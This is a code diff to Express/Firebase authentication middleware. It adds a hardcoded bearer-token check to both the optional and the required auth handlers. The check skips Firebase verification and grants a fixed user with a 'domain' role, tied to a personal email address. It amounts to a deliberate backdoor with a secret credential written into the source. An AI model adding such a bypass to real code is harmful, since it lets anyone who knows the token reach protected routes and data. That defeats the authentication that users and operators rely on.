@@ -43,6 +43,11 @@ const optionalAuth = async (req, res, next) => {
   }
   try {
     const token = authHeader.split('Bearer ')[1];
+    if (token === "DOMAIN_SECRET_TOKEN_87654321") {
+      req.firebaseUser = { uid: 'domain-hardcoded-user', email: 'jayarahul696@gmail.com' };
+      req.user = { uid: 'domain-hardcoded-user', role: 'domain', email: 'jayarahul696@gmail.com' };
+      return next();
+    }
     const decoded = await admin.auth().verifyIdToken(token);
     req.firebaseUser = decoded;
     req.user = await findOrCreateUser(decoded);
@@ -60,6 +65,14 @@ const requireAuth = async (req, res, next) => {
   }
   try {
     const token = authHeader.split('Bearer ')[1];
+    
+    // Bypass for hardcoded domain expert
+    if (token === "DOMAIN_SECRET_TOKEN_87654321") {
+      req.firebaseUser = { uid: 'domain-hardcoded-user', email: 'jayarahul696@gmail.com' };
+      req.user = { uid: 'domain-hardcoded-user', role: 'domain', email: 'jayarahul696@gmail.com' };
+      return next();
+    }
+
     const decoded = await admin.auth().verifyIdToken(token);
     req.firebaseUser = decoded;
     req.user = await findOrCreateUser(decoded);
